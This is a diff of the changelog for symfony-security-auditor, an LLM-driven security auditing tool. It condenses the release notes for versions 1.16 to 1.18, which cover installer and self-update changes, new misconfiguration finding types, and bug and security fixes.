-  severity" table and the Distribution section's by-severity chart printed the
-  same numbers, one above the other; `HtmlReportRenderer` now emits the chart
-  only (each bar carries its own count as text, so nothing is lost), and the
-  `table.summary` styles are gone from the report template. A report with no
-  findings still shows the "No validated vulnerabilities found." message.
-
-### Fixed
-
-- **Concurrent attacker analysis no longer drops every file after a batch
-  error.** When `completeBatchWithTools()` threw anything other than a budget or
-  provider failure (e.g. `InvalidTokenUsageException` from a hostile
-  provider-response token count), `ConcurrentChunkAnalyzer::dispatchInWindows()`
-  `return`ed from inside its window loop, so every window after the failing one
-  was marked `errored` without ever being sent to the LLM — a single odd runtime
-  error silently dropped all later files from the audit and reported them as
-  covered, a false-negative that only affected concurrent mode (the `fast`
-  profile's `attacker_max_concurrent > 1`); sequential mode already isolated the
-  failure to the one chunk and continued. The generic-error branch now fails
-  only the window that threw and continues with the rest, mirroring the
-  sequential analyzer's per-chunk recovery.
-
-- **Long vulnerability-type names no longer collide with their bar in the HTML
-  report's distribution charts.** `DistributionBarChart` reserved 170px for the
-  label column, but a type value such as `insecure_direct_object_reference`
-  renders wider than that at the chart's font size, so its tail ran underneath
-  the bar. The label column is now 250px wide and the bars 290px, which fits the
-  longest `VulnerabilityType` value with margin and keeps the count label inside
-  the 600px viewBox.
-
-- **The executive summary no longer claims "No validated findings" when it is
-  listing findings.** `ExecutiveSummaryReportRenderer::businessImpact()` mapped
-  `RiskLevel::Safe` to the prose "No validated findings … no business exposure",
-  but Safe is derived as `riskScore < 5`, so a report whose only validated
-  findings are low-impact (a single LOW scores 2, and INFO scores 0) is Safe
-  while `totalVulnerabilities() > 0`. The report then printed that "nothing
-  found" sentence directly above the finding count and severity/type/hotspot
-  breakdown — a self-contradiction. The Safe wording now depends on the finding
-  count: with findings it reads "Negligible business exposure: the validated
-  findings are low-impact …", and only a genuinely empty report keeps the
-  original sentence.
-
-### Security
-
-- **`privacy.offline_only` no longer treats an IPv4-mapped IPv6 endpoint as
-  local.** `OfflineOnlyPlatformGuard::isLocal()` classified a host such as
-  `[::ffff:8.8.8.8]` — the IPv4-mapped IPv6 form of the public address `8.8.8.8`
-  — as local, because PHP flags the whole `::ffff:0:0/96` range as reserved and
-  `FILTER_FLAG_NO_RES_RANGE` masked the public embedded address. An
-  `offline_only` run configured with such a `base_url` would have booted and
-  sent source code to a public host instead of aborting. The guard now unwraps a
-  mapped host to its embedded IPv4 before the private/reserved check, so
-  `[::ffff:8.8.8.8]` is refused with `NonLocalPlatformEndpointException` while
-  `[::ffff:127.0.0.1]` stays local. Caught before release — the feature ships
-  first in this version.
+- Concurrent analysis (`audit.attacker_max_concurrent` above `1`, as in the `fast` profile): an unexpected error in one batch no longer drops every later file from the audit, only the failing batch is lost, as in sequential mode ([#225](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/225))
 
 ## [1.17.0] — 2026-07-23 — Preflight
 
-A release about the standalone binary looking after itself. The binary now tells
-you when a newer release is available (throttled, interactive-only,
-stderr-only), a single `curl … | SSA_INIT=1 sh` installs _and_ configures it,
-`init` is fully scriptable (`--provider`/`--model`/`--env-var`/`--force`) with
-its inputs validated before anything is written, and the new `doctor` command
-preflights the whole environment — including actually booting the audit with the
-installed provider bridge — before a run. A pre-release bug hunt hardened the
-same surface: `v`-prefixed tags can no longer disable update detection, metadata
-lookups are tightly bounded, and non-UTF-8 input is rejected instead of
-crashing.
+### New Features ✨
 
-### Added
+- The standalone binary prints a one-line notice on stderr, after a command on an interactive terminal, when a newer release is available; the lookup runs at most once per 24 hours, never changes an exit code, stays silent on Windows and is disabled with `SSA_NO_UPDATE_CHECK=1` ([#197](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/197), [#201](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/201))
+- `curl -fsSL …/install.sh | SSA_INIT=1 sh` installs and configures the standalone binary in one command: after the checksum check the installer runs `init`, interactively when a terminal is reachable and with `--no-interaction` otherwise; a failed `init` keeps the installed binary ([#191](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/191))
+- `install.sh` points Git Bash, MSYS and Cygwin users at the PowerShell installer, and the install docs lead with the `curl … | sh` one-liner ([#191](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/191))
+- `init` accepts `--provider`, `--model` and `--env-var` for scripted setups such as `init --provider=openai --model=gpt-5.4 --no-interaction`; blank values or an invalid variable name exit `2` before anything is written, and the bridge is installed before the configuration file so a failed install keeps the previous setup ([#193](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/193), [#210](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/210))
+- `init --force` overwrites an existing configuration without asking, so a CI pipeline can switch providers instead of silently keeping the old one ([#204](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/204))
+- The standalone-only `doctor` command checks the configuration, the provider bridge (by actually booting the audit with it) and Composer, printing one line each and exiting `0` on pass or warning and `1` on failure, so `symfony-security-auditor doctor && symfony-security-auditor audit` works as a CI preflight ([#196](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/196), [#210](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/210))
 
-- **The standalone binary now tells you when a newer release is available.**
-  After a command finishes on an interactive terminal, the binary prints a
-  one-line notice to stderr pointing at `self-update` when the installed version
-  is behind the latest GitHub release. The GitHub lookup is throttled to once
-  per 24 hours (cached under the XDG cache directory) and is fully best-effort:
-  it runs only on an interactive run (so piped/CI output and `--format=json`
-  stay clean), and any failure (offline, rate-limited) is swallowed and never
-  changes a command's exit code. Set `SSA_NO_UPDATE_CHECK=1` to disable it. The
-  notice exists only in the standalone binary (the Composer bundle updates
-  through `composer update`). Implemented by
-  `ThrottledUpdateAvailabilityNotifier` + `FilesystemUpdateCheckStore`
-  (`src/Audit/Infrastructure/SelfUpdate/`) and wired into the standalone
-  application through a console `TERMINATE` listener
-  (`UpdateAvailabilityConsoleListener`).
-- **One command installs _and_ configures the standalone binary via
-  `SSA_INIT`.** `install.sh` now honors an `SSA_INIT` environment variable: with
-  `SSA_INIT=1`, after the binary is downloaded and its SHA-256 checksum
-  verified, the installer runs `<binary> init` — so
-  `curl -fsSL …/install.sh | SSA_INIT=1 sh` installs and configures the tool in
-  a single command instead of the previous two (`install.sh`, then `init`). When
-  a controlling terminal is reachable (the installer test-opens `/dev/tty`)
-  `init` runs interactively, so the provider/model prompts still work through a
-  `curl | sh` pipe; in a pipe or CI with no terminal it falls back to
-  `init --no-interaction` (Anthropic defaults). The installer invokes the binary
-  by its absolute install path, so `init` runs even when the target directory is
-  not yet on `PATH`. A failed `init` (e.g. `composer` unavailable) is non-fatal
-  — the installed binary is kept and a note points the user to run `init`
-  themselves. Documented in `README.md` and the `install.sh` header, and covered
-  by `tests/Shell/install_script_test.sh`.
-- **`init` is now scriptable via `--provider`, `--model`, and `--env-var`
-  options.** Previously `symfony-security-auditor init` only asked interactively
-  and, under `--no-interaction`, always wrote the Anthropic defaults — so a
-  non-interactive install could not target a different provider. Each option now
-  skips its matching prompt; any option left out still falls back to its prompt
-  (or, non-interactively, to its default: `anthropic`, `claude-opus-4-8`, and a
-  `<PROVIDER>_API_KEY` variable derived from the resolved provider). This lets a
-  single command configure any provider — e.g.
-  `init --provider=openai --model=gpt-5.4 --no-interaction`. Inputs are
-  validated before anything happens: a blank provider or model, or an
-  `--env-var` value that is not a valid environment variable name (which would
-  produce an unresolvable `%env(...)%` placeholder), aborts with exit code `2`
-  and leaves both the configuration and the bridge untouched. The bridge is
-  installed **before** the configuration file is written, so a failed bridge
-  download (offline, `composer` missing) leaves the previous, working
-  configuration in place instead of a half-switched setup whose config names one
-  provider while the installed bridge serves another. The standalone installer's
-  `SSA_INIT` no-terminal fallback and the GitHub Action run plain
-  `init --no-interaction` (the Anthropic defaults); pass the options yourself to
-  script a different provider. Documented in
-  [`docs/configuration.md`](docs/configuration.md#standalone-configuration).
-- **`init --force` overwrites an existing configuration without asking.**
-  Non-interactive reconfiguration was previously impossible: with a
-  `config.yaml` already present, the overwrite confirmation defaults to "no"
-  under `--no-interaction`, so `init --provider=… --no-interaction` warned,
-  changed nothing, and still exited 0 — a CI pipeline switching providers
-  silently kept auditing with the stale configuration. `--force` skips the
-  confirmation in both interactive and non-interactive runs, and the abort
-  warning now points at it ("use `--force` to overwrite").
-- **New `doctor` command preflights the standalone environment before an
-  audit.** `symfony-security-auditor doctor` runs three checks and prints one
-  line each: **Configuration** (`config.yaml` resolves, a `platform:` block is
-  present, and any `%env(...)%` API-key variable it references is set),
-  **Provider bridge** (the `symfony/ai-*` bridge autoloader is installed under
-  the data directory _and the audit actually boots with it_ — the probe runs the
-  exact configuration-load → container-build → command-instantiation path
-  `audit` uses at startup, so a leftover bridge from a previously configured
-  provider is reported as a failure instead of green-lighting an audit that
-  would abort at boot), and **Composer** (a runnable `composer` is reachable). A
-  missing `composer` is a warning — auditing still works — while a
-  missing/invalid configuration or an uninstalled/unbootable bridge is a
-  failure. The boot probe is skipped while the configuration check fails, so a
-  config problem is reported once, by the check that owns it. The command exits
-  `0` when every check passes or only warns and `1` when any check fails, so it
-  drops into a CI preflight step
-  (`symfony-security-auditor doctor && symfony-security-auditor audit`). The
-  command exists only in the standalone binary. Implemented by `DoctorCommand`
-  delegating to `EnvironmentDoctor` (`src/Command/`), with the boot probe behind
-  `AuditPreflightInterface` (`src/Command/`) implemented by
-  `StandaloneAuditPreflight` (`src/Standalone/`), wired into the standalone
-  application by `StandaloneApplicationFactory`.
+### Bugfixes 🐛
 
-### Changed
-
-- **The standalone install docs now lead with the cross-platform `curl … | sh`
-  one-liner**, with the PowerShell `irm … | iex` command demoted to the
-  native-Windows fallback — the single `curl` command covers Linux, macOS, and
-  Windows under WSL. On the Windows POSIX shells (Git Bash / MSYS / Cygwin) the
-  native binary is the right artifact, so `install.sh` redirects them to the
-  PowerShell installer instead (see below).
-- **`install.sh` now points Windows POSIX-shell users (Git Bash / MSYS / Cygwin)
-  at the PowerShell installer.** It previously failed there with a generic
-  "download the `.exe`" message; it now detects a `MINGW*`/`MSYS*`/`CYGWIN*`
-  `uname` and prints the exact `irm …/install.ps1 | iex` command to run instead.
-  (A bare PowerShell session can't execute `install.sh` at all — there is no
-  `sh` to pipe into — so this guidance targets the POSIX shells on Windows that
-  can.)
-
-### Fixed
-
-- **A `v`-prefixed release tag can no longer silently disable update
-  detection.** `SelfUpdater` compared GitHub's `tag_name` verbatim, and PHP's
-  `version_compare()` ranks any `v`-prefixed string _below_ every plain version
-  — `version_compare('v1.18.0', '1.16.0', '>')` is `false` — so if a release
-  were ever tagged `v1.18.0` instead of `1.18.0`, `self-update` would report
-  "Already up to date" and the update notice would stay silent, with no error
-  anywhere. The tag is now compared and displayed with any leading `v`/`V`
-  stripped, while download URLs keep the tag verbatim (that is the path the
-  release assets publish under).
-- **The update check can no longer stall an interactive command on a black-holed
-  network.** `ProcessReleaseClient` gave every request the binary-download
-  budget — `--connect-timeout 30` and `--max-time 600` — so a firewall that
-  silently drops packets could hold the after-command update notice (and
-  `self-update`'s metadata lookups) for up to 30 seconds on connect and minutes
-  on a stalled transfer. Release-metadata `get()` requests are now bounded to
-  `--connect-timeout 10` / `--max-time 20`; binary `download()` transfers keep
-  the generous 600-second window they need on slow links.
-- **`self-update`'s macOS fallbacks accept only executable regular files, so a
-  same-named stray file or directory is never replaced instead of the running
-  binary.** Without `/proc/self/exe`, `RunningBinaryLocator` `realpath()`ed the
-  invoked name against the working directory and then across `PATH`, taking the
-  first hit of any kind — unlike the shell, it never checked what it found. A
-  stray `symfony-security-auditor` file in the current directory (or a directory
-  on `PATH`) could be selected: a regular file was silently overwritten by the
-  downloaded release while the real binary stayed outdated (and the update
-  notice kept re-appearing), and a directory made the replacement fail. Both
-  fallbacks now require an executable regular file, the way the shell resolves
-  commands.
-- **`init` no longer writes an unbootable configuration when the provider is
-  spelled as a bridge package slug (`open-ai`, `deep-seek`, …).** `init` never
-  validated the provider value: for the seven hyphenated package slugs
-  (`open-ai`, `open-responses`, `deep-seek`, `vertex-ai`, `hugging-face`,
-  `eleven-labs`, `amazee-ai`) the bridge install genuinely succeeded — they are
-  real package names — and `config.yaml` was written with a platform key
-  `symfony/ai` does not recognize, so `init` exited 0 with a success message
-  while every later `audit` aborted at container build. A new
-  `ProviderKeyNormalizer` (`src/Audit/Infrastructure/Bridge/`) now trims,
-  lowercases, and folds package slugs back to their platform config keys
-  (`open-ai` → `openai`) before the configuration is written and the bridge
-  installed.
-- **`self-update` now fails fast on platforms without a published self-update
-  path (native Windows), and the update notice stays silent there.** The
-  platform check in `GitHubBinaryAssetResolver` only ran on the real-update
-  path, so on Windows `self-update` performed the GitHub lookup first and then
-  either threw `UnsupportedSelfUpdatePlatformException` or — when already on the
-  latest release — misleadingly reported "Already up to date", while the new
-  update notice pointed Windows users at a command that can never succeed there.
-  `SelfUpdater::run()` now asserts platform support before any network call:
-  `self-update` fails immediately with the download-from-releases-page guidance,
-  and the throttled notice check treats the platform as check-failed, so no
-  notice is printed on Windows.
-- **`install.sh` no longer fails silently when the `wget` fallback hits an HTTP
-  error.** The `wget` download path in `download()` used `-q`, which suppresses
-  wget's error output, so a failed request (e.g. a 404 for a missing release
-  asset) aborted the installer under `set -eu` with no diagnostic — unlike the
-  `curl` path (`curl -fSL`), which prints the HTTP error. Dropping `-q` restores
-  a visible failure reason on the `wget` path.
-- **`install.ps1` now shows its "no Windows binary for this release" guidance on
-  PowerShell 7, not only Windows PowerShell 5.1.** The friendly 404 handler
-  caught `[System.Net.WebException]`, which only Windows PowerShell 5.1 throws;
-  PowerShell 7+ (the common `irm | iex` host, built on .NET Core) throws
-  `Microsoft.PowerShell.Commands.HttpResponseException`, so the typed `catch`
-  never matched and users saw a raw transport error instead of the Composer/WSL
-  fallback instructions. A new `Get-ResponseStatusCode` helper reads the status
-  from the error record's shared `Response` property regardless of the thrown
-  exception type, so the guidance appears on both PowerShell editions.
-- **`self-update` now resolves the running binary on macOS when it was launched
-  by a bare name found on `PATH`.** `RunningBinaryLocator` located the
-  executable via `/proc/self/exe` (Linux-only) and, failing that, `realpath()`
-  of the invoked entry path. macOS has no `/proc/self/exe`, and a binary started
-  as a bare command name (e.g. `symfony-security-auditor self-update` resolved
-  through `PATH`) has an entry path that `realpath()` cannot resolve against the
-  working directory, so `self-update` aborted with "could not determine the path
-  of the running binary". The locator now adds a final fallback that looks the
-  bare name up across the `PATH` directories (the same way the shell found it),
-  threaded in from the process environment via `StandaloneApplicationFactory`.
-  Linux behavior (kernel-reported `/proc/self/exe`) is unchanged.
+- `init`: a provider spelled as a bridge package slug (`open-ai`, `deep-seek`, `vertex-ai`, …) is normalized to its platform key (`openai`, …), instead of writing a configuration every later `audit` rejects ([#202](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/202))
+- `self-update`: a release tag with a leading `v` no longer disables update detection, since it is compared and shown without the `v` ([#210](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/210))
+- `self-update`: release-metadata lookups give up after 10 seconds to connect and 20 seconds in total instead of stalling a command on a black-holed network, while binary downloads keep their 600-second window ([#210](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/210))
+- `self-update`: the macOS path fallbacks accept only executable regular files, so a stray same-named file or directory is never replaced instead of the running binary ([#205](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/205))
+- `self-update`: it resolves the running binary on macOS when launched by a bare name found on `PATH` ([#194](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/194))
+- `self-update`: it fails immediately on native Windows, where no self-update path is published, instead of looking up the release first and reporting "Already up to date" ([#201](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/201))
+- `install.sh`: a failed `wget` download now prints its HTTP error instead of aborting silently ([#192](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/192))
+- `install.ps1`: the "no Windows binary for this release" guidance now shows on PowerShell 7 as well as Windows PowerShell 5.1 ([#192](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/192))
 
 ## [1.16.0] — 2026-07-18 — Perimeter
 
-A release about the security perimeter. The attacker gains a wave of
-misconfiguration hunts — HTTP trust boundaries (wildcard `trusted_proxies`,
-Host-header injection / cache poisoning), permissive CORS, weak CSP, missing
-HSTS, weak password hashing, debug mode left on, permissive Mercure topics, plus
-LDAP and admin-panel surfaces — and the reviewer learns across runs through
-opt-in triage memory. The standalone binary can now update itself in place with
-`self-update`, MiniMax joins as a first-class provider, and truncated /
-content-filtered LLM responses are finally surfaced instead of lost. A large
-batch of fixes hardens triage memory (per-project isolation, stable cache keys,
-bounded prompt injection surface) and wires the new attacker skills that were
-built but never registered.
+### New Features ✨
 
-### Added
+- The attacker flags HTTP trust-boundary misconfigurations: a wildcard `trusted_proxies` (`0.0.0.0/0`, `::/0`) that lets clients spoof `X-Forwarded-*`, and `getHost()`-style calls building links without `trusted_hosts`, as the new `trusted_proxy_misconfiguration` and `host_header_injection` finding types ([#172](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/172), [#188](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/188))
+- The attacker hunts weak password hashing, `remember_me` with `secure: false`, NelmioCors `origin_regex: true`, CSP `'unsafe-inline'` / `'unsafe-eval'`, disabled HSTS and `APP_DEBUG=1`, as new finding types `weak_password_hashing`, `permissive_cors_origin`, `weak_content_security_policy`, `missing_transport_security` and `debug_mode_enabled` ([#175](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/175), [#188](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/188))
+- A `RememberMeBadge` attached to every login regardless of a user-submitted "remember me" flag is now flagged ([#175](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/175))
+- The attacker audits LDAP services, Sonata Admin and EasyAdmin panels: unescaped LDAP filter or DN concatenation, admin panels exposing privileged fields (`roles`, `password`, `isAdmin`) or lacking per-object access control, and EasyAdmin actions not scoped by `->setPermission()` ([#180](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/180), [#188](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/188))
+- The new `permissive_mercure_topic_selector` finding type covers a Mercure JWT `publish` / `subscribe` claim scoped to `*`, and the recipe's default JWT secret placeholder is flagged ([#180](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/180))
+- `audit.since_closure: none|direct` widens a `--since` run to the controllers guarded by a changed voter, so a voter edit that weakens an unrelated controller is still caught in CI; `thorough` defaults to `direct`, `balanced` and `fast` to `none`, and an explicit value always wins ([#174](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/174))
+- Imported SARIF results with a taint-tracking `codeFlows` path show the attacker the full source-to-sink path, with `...` marking steps dropped for pointing outside the scan surface ([#176](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/176), [#184](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/184))
+- `audit.triage_memory: true` has the reviewer remember its rejections across runs: each explained rejection is kept per audited project under `<cache.dir>/triage-memory/` (500 entries max) and shown to later reviews beside `audit.baseline` reasons, in every review mode ([#177](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/177), [#184](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/184), [#188](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/188))
+- Triage-memory feedback is presented to the reviewer as non-authoritative and newest first, with each reason capped at 5000 characters, and the reviewer verdict cache keeps working when it is on ([#184](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/184), [#188](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/188))
+- Truncated or content-filtered LLM responses now log an actionable warning (pointing at `max_output_tokens` for truncation) instead of surfacing as silent finding loss, and HTTP 5xx server errors are retried as transient ([#183](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/183))
+- MiniMax is supported as a provider through `symfony/ai-mini-max-platform` and its `MINIMAX_API_KEY` variable, with token estimation calibrated for `MiniMax-M2` models ([#181](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/181))
+- `symfony-security-auditor self-update` replaces the standalone binary in place after verifying the release's SHA-256 checksum, and `--check` only reports whether an update exists; it refuses to run outside the standalone binary, never installs from a shared download path and gives up on a stalled network after 600 seconds ([#166](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/166), [#184](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/184))
+- The GitHub Action gains `mode: standalone` (runs the checksum-verified binary from the pinned action version instead of the bundle), a `fail-on` input and the outputs `exit-code`, `report-path`, `findings-count` and `highest-severity`, which are written even when the audit fails ([#173](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/173), [#184](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/184))
 
-- **`Vulnerability::of()` accepts an optional `detectedAt` timestamp.** The
-  factory still defaults to `new DateTimeImmutable()` when the argument is
-  omitted, so existing callers are unaffected; passing an explicit
-  `DateTimeImmutable` lets a finding be reconstructed with a known detection
-  time (and lets tests assert timestamp-dependent behaviour deterministically
-  instead of sleeping).
-- **Truncated and content-filtered LLM responses are now called out
-  explicitly.** `symfony/ai` 0.11 exposes a normalized `finish_reason` on every
-  platform result; `PlatformResultExtractor` now reads it, so `LLMResponse`
-  carries the real provider stop reason (e.g. `max_tokens`) instead of a
-  hard-coded `end_turn`, and the auditor logs an actionable
-  `LLM response was truncated by the output token limit` warning (pointing at
-  `max_output_tokens`) when a response was truncated, or a
-  `suppressed by the provider content filter` warning when the provider filtered
-  it out — both previously surfaced only as silent finding loss or empty-chunk
-  noise. `TransientFailureClassifier` additionally recognizes symfony/ai's typed
-  `ServerException` (HTTP 5xx) as transient, so server-side hiccups are retried
-  even when the provider's error wording matches no known heuristic.
+### Bugfixes 🐛
 
-- **MiniMax is now a first-class provider.** `symfony/ai-bundle` 0.11 ships a
-  `minimax` platform configuration backed by the new
-  `symfony/ai-mini-max-platform` bridge, so the auditor can run on
-  `MiniMax-M2`-family models like any other provider. A new
-  `MiniMaxTokenEstimator`
-  (`src/Audit/Infrastructure/LLM/TokenEstimator/MiniMaxTokenEstimator.php`)
-  joins the `ResolvingTokenEstimator` chain so cost previews and rate-limit
-  pacing use a MiniMax-calibrated characters-per-token ratio instead of the
-  generic fallback. The bridge is listed in `composer.json` `suggest`, and the
-  provider tables in `README.md` and
-  [`docs/configuration.md`](docs/configuration.md) document the package and its
-  `MINIMAX_API_KEY` env var.
+- A YAML config file with numeric top-level keys no longer crashes the audit with a `TypeError` before any LLM call ([#188](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/188))
+- The native Windows binary is published with releases again ([#168](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/168))
 
-- **New `self-update` command updates the standalone binary in place.**
-  `symfony-security-auditor self-update` queries the GitHub releases API for the
-  latest version and, when a newer one exists, downloads the asset matching the
-  running platform (mirroring `install.sh`'s OS/arch detection), **verifies its
-  `.sha256` checksum before touching anything**, and atomically replaces the
-  running binary; `--check` only reports whether an update is available without
-  modifying anything. Downloads go through `curl` via Symfony `Process` (no new
-  runtime dependency), and the binary refuses to update when it is not writable,
-  pointing at `sudo`/reinstall instead. Standalone-only — it is not registered
-  in the bundle. Implementation lives in `src/Audit/Infrastructure/SelfUpdate/`.
-  See
-  [CLI Reference → `self-update`](docs/configuration.md#self-update--updating-the-standalone-binary).
+### Core 🧱
 
-- **The attacker now hunts HTTP trust-boundary misconfigurations: wildcard
-  `trusted_proxies`, and Host-header injection / cache poisoning.** Two new
-  `AttackerSkillInterface` strategies — `TrustBoundaryAttackerSkill` (`CONFIG`)
-  and `ControllerTrustBoundaryAttackerSkill` (`CONTROLLER`) — teach the attacker
-  to flag `framework.trusted_proxies`/`TRUSTED_PROXIES` set to a wildcard CIDR
-  (`0.0.0.0/0`, `::/0`), which lets any client spoof `X-Forwarded-*` headers and
-  defeat IP allowlists and rate limiters, and to flag `Request::getHost()` /
-  `getSchemeAndHttpHost()` / `getHttpHost()` used to build links or cache
-  decisions without `trusted_hosts` configured. `RegexStaticPreScanner` gained
-  matching `trusted_proxies_wildcard` and `forwarded_host_usage` risk markers
-  (`CACHE_VERSION` bumped to 27). Two new `VulnerabilityType` cases —
-  `host_header_injection` (CWE-20) and `trusted_proxy_misconfiguration`
-  (CWE-290) — cover the new findings, both under OWASP A02:2025 - Security
-  Misconfiguration. Implementation lives in
-  `src/Audit/Infrastructure/Prompt/Skill/` and
-  `src/Audit/Infrastructure/Scan/RegexStaticPreScanner.php`.
-
-- **The GitHub Action can now run the standalone binary instead of requiring the
-  bundle, and exposes first-class outputs.** A new `mode: bundle|standalone`
-  input (default `bundle`, matching prior behavior) downloads the
-  checksum-verified standalone binary via `install.sh` and configures it with
-  `symfony-security-auditor init --no-interaction` instead of running
-  `composer install` + `bin/console audit:run` — the target project no longer
-  needs the bundle in its `composer.json`. A host PHP + Composer are still
-  required in standalone mode (`setup-php` stays `true`) since `init` fetches
-  the provider bridge through Composer; standalone mode in this action always
-  configures the `anthropic`/`claude-opus-4-8` default non-interactively. The
-  action also gained an `outputs:` block (`exit-code`, `report-path`, and, when
-  `format: json`, `findings-count`/`highest-severity` read from the report's
-  `total_vulnerabilities`/`risk_level` fields via `jq`) and a first-class
-  `fail-on` input (previously reachable only through `extra-args`).
-  Implementation lives in `action.yml`.
-
-- **The attacker now hunts weak password hashing, permissive CORS, weak CSP,
-  missing HSTS, and debug mode left enabled.** Five new `VulnerabilityType`
-  cases — `weak_password_hashing` (CWE-916), `permissive_cors_origin` (CWE-942),
-  `weak_content_security_policy` (CWE-693), `missing_transport_security`
-  (CWE-319), and `debug_mode_enabled` (CWE-489), all under OWASP A02:2025 -
-  Security Misconfiguration except `weak_password_hashing` (OWASP A04:2025 -
-  Cryptographic Failures). `RegexStaticPreScanner` gained six matching `CONFIG`
-  risk markers (`CACHE_VERSION` bumped to 29): `weak_password_hasher_algorithm`
-  flags `security.password_hashers.*.algorithm` set to `plaintext`, `md5`, or
-  `sha1` instead of `auto`; `remember_me_secure_false` flags a `remember_me`
-  firewall cookie configured with `secure: false`;
-  `unanchored_cors_origin_regex` flags NelmioCors `origin_regex: true`,
-  prompting a check that every `allow_origin` pattern is anchored with `^...$`
-  (an unanchored regex matches as a substring and can allow unintended origins);
-  `csp_unsafe_inline_or_eval` flags a Content-Security-Policy directive allowing
-  `'unsafe-inline'` or `'unsafe-eval'`; `hsts_disabled` flags NelmioSecurity
-  `forced_ssl.enabled: false`; `app_debug_enabled` flags `APP_DEBUG=1`/`=true`
-  in a dotenv file. `ConfigAttackerSkill` gained matching hunt bullets, and
-  `AuthenticatorAttackerSkill`'s blanket "do not flag `RememberMeBadge`"
-  carve-out was narrowed to only exempt conditionally-attached badges — a
-  `RememberMeBadge` attached unconditionally (not gated on a user-submitted
-  "remember me" flag) is now flagged, since it issues a long-lived
-  authentication cookie for every login regardless of consent. Implementation
-  lives in `src/Audit/Domain/Model/VulnerabilityType.php`,
-  `src/Audit/Infrastructure/Scan/RegexStaticPreScanner.php`, and
-  `src/Audit/Infrastructure/Prompt/Skill/`.
-
-- **`--since` diff-mode runs can now widen the audited file set to a changed
-  voter's guarded controllers.** New `audit.since_closure: none|direct` key,
-  profile-dependent like its sibling cost/depth levers (balanced/fast: `none`,
-  matching every prior release exactly; thorough: `direct`, since that profile
-  already trades cost for detection depth). With `direct`, the new
-  `DependencyExpansionStage` reads the full-project `AccessControlMap`
-  `MappingStage` already builds even in diff mode, finds every changed voter in
-  the `--since` file set, and pulls in any controller (from the full scan scope)
-  guarded by an attribute the voter's `supports()` accepts — whether that guard
-  is a method-level or class-level `#[IsGranted]` or a
-  `denyAccessUnlessGranted()`/`isGranted()` call — so a voter edit that silently
-  weakens an unrelated controller's access control is still caught by a
-  diff-scoped CI run. Sets a `dependency_expansion.files_added` metadata
-  counter. `direct` increases the cost and finding scope of `--since` runs; an
-  explicit `since_closure` value always wins over the profile. Implementation
-  lives in `src/Audit/Application/Pipeline/Stage/DependencyExpansionStage.php`
-  and `src/Audit/Domain/Configuration/AuditProfile.php`.
-
-- **Imported SARIF results with a taint-tracking `codeFlows` path now carry the
-  full source-to-sink evidence, not just the sink line.**
-  `SarifImportingPreScanner` reads `codeFlows[0].threadFlows[0].locations` when
-  present and appends the path as `(taint path: file:line -> file:line -> …)` to
-  the marker's description, so the attacker sees exactly how tainted data
-  reaches the sink instead of only the single flagged line. Steps pointing
-  outside the scan surface are dropped, same as the primary location.
-  Implementation lives in
-  `src/Audit/Infrastructure/Scan/SarifImportingPreScanner.php`.
-
-- **The reviewer can now remember its own rejections across runs.** A new
-  `audit.triage_memory` boolean (default `false`) opts into persisting every
-  finding the reviewer rejects with a non-empty `reviewer_notes` explanation to
-  cross-run memory (one file per audited project under
-  `<cache.dir>/triage-memory/`, keyed by type+file+title+line, capped at 500
-  entries) and surfacing it back to the reviewer on later runs — the same
-  "maintainer-trusted false-positive feedback" treatment `audit.baseline`
-  entries with a `reason` already get, but recorded automatically from the
-  reviewer's own reasoning instead of hand-curated. Memory is scoped to the
-  audited project, so a shared (user-global) cache directory — the standalone
-  binary's default — never leaks one project's rejections into another's review.
-  Merges with any baseline-sourced feedback via the new
-  `CompositeReviewerFeedbackProvider` — deduplicated by finding identity
-  (type+file+title) so a finding present in both the baseline and triage memory
-  occupies a single reviewer-prompt slot, with the baseline reason winning.
-  Reviewer-verdict cache keys incorporate the combined feedback, and the first
-  reason recorded for a finding is kept on later runs so the feedback set
-  stabilizes — affected findings are re-reviewed once when the feedback set
-  grows, then served from cache. Two new Domain ports —
-  `ReviewerFeedbackProviderInterface` (pre-existing, now composable) and the new
-  `TriageMemoryRecorderInterface` — are documented as extension points in
-  `docs/extending.md`. Implementation lives in
-  `src/Audit/Infrastructure/Cache/FilesystemTriageMemoryStore.php` and
-  `src/Audit/Application/Agent/Review/ReviewOutcomeRecorder.php`.
-
-- **The attacker now hunts LDAP injection and broken access control in Sonata
